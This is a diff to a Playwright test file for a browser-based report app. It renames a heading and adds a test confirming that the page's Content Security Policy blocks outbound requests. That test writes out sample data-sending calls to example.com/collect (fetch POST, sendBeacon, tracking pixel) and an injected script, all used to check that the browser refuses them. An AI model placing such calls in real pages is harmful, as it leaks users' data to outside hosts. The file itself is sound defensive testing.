@@ -105,7 +105,7 @@ def test_5_revised_workflow_compared_without_overwriting(page):
 
 def test_6_human_readable_report_with_uncertainty(page):
     text = report_text(page)
-    for heading in ["ICA conditions analysis", "A. Process conditions identified", "B. Observed discrepancies", "C. Boundary and transmission analysis",
+    for heading in ["Conditions analysis", "A. Process conditions identified", "B. Observed discrepancies", "C. Boundary and transmission analysis",
                     "D. Functional consequences", "E. Improvement opportunities", "F. Evidence limitations"]:
         assert heading in text
     assert "{" not in text and '"id"' not in text
@@ -199,7 +199,7 @@ def section(text, start, end):
 
 def test_p0_1_uncertain_responsibility_is_not_reported_as_disclaimed(page):
     text = report_text(page)
-    where = section(text, "Where the work did not connect", "ICA conditions analysis")
+    where = section(text, "Where the work did not connect", "Conditions analysis")
     disclaimed = section(where, "every answering role said belonged to another role", "Responsibilities with ownership uncertain")
     uncertain = where.split("Responsibilities with ownership uncertain")[1]
     assert "Acting on the critical lactate result" in disclaimed
@@ -486,3 +486,42 @@ def test_stage_heading_draws_no_box_over_its_label(page):
     assert page.evaluate("getComputedStyle(document.activeElement).outlineStyle") == "none"
     eb = page.locator("#s-timeline .eyebrow").first.bounding_box(); h2 = page.locator("#s-timeline h2").bounding_box()
     assert eb["y"] + eb["height"] <= h2["y"] + 1
+
+
+def test_security_policy_blocks_sending_and_allows_normal_use(base_url):
+    with sync_playwright() as p:
+        b = p.chromium.launch()
+        ctx = b.new_context(accept_downloads=True)
+        pg = ctx.new_page()
+        pg.add_init_script("window.__violations = []; document.addEventListener('securitypolicyviolation', e => window.__violations.push(e.violatedDirective + ' ' + e.blockedURI));")
+        errors, outside = [], []
+        pg.on("pageerror", lambda e: errors.append(str(e)))
+        pg.on("requestfinished", lambda r: outside.append(r.url) if "example.com" in r.url else None)
+        pg.goto(base_url + "#event")
+        pg.wait_for_selector("nav.stages a[aria-current=page]")
+        assert "connect-src 'none'" in pg.get_attribute('meta[http-equiv="Content-Security-Policy"]', "content")
+        # normal use: every stage, a step, a saved file, a reload of the data
+        for stage in STAGE_ORDER + ["save"]:
+            pg.evaluate(f"location.hash = '{stage}'")
+            pg.wait_for_selector(f"#s-{stage}:not([hidden])")
+        pg.evaluate("location.hash = 'timeline'"); pg.wait_for_selector("#s-timeline:not([hidden])")
+        pg.fill("#st-time", "23:00"); pg.fill("#st-what", "Test step"); pg.click("#st-save")
+        pg.evaluate("location.hash = 'save'"); pg.wait_for_selector("#s-save:not([hidden])")
+        with pg.expect_download() as d:
+            pg.click("#save-file")
+        assert d.value.suggested_filename.endswith(".seamline.json")
+        assert pg.evaluate("window.__violations") == []
+        assert errors == []
+        # sending anything to another site is refused by the browser
+        assert pg.evaluate("fetch('https://example.com/collect', {method: 'POST', body: 'x'}).then(() => 'sent', () => 'blocked')") == "blocked"
+        pg.evaluate("navigator.sendBeacon('https://example.com/collect', 'x')")
+        pg.evaluate("new Image().src = 'https://example.com/pixel.gif'")
+        pg.wait_for_timeout(300)
+        v = pg.evaluate("window.__violations")
+        assert any(x.startswith("connect-src") for x in v) and any(x.startswith("img-src") for x in v), v
+        assert sum(x.startswith("connect-src") for x in v) >= 2, v  # the fetch and the beacon
+        assert outside == [], outside
+        # a script injected into the page does not run
+        pg.evaluate("const s = document.createElement('script'); s.textContent = 'window.__injected = true'; document.body.appendChild(s)")
+        assert pg.evaluate("window.__injected === true") is False
+        b.close()
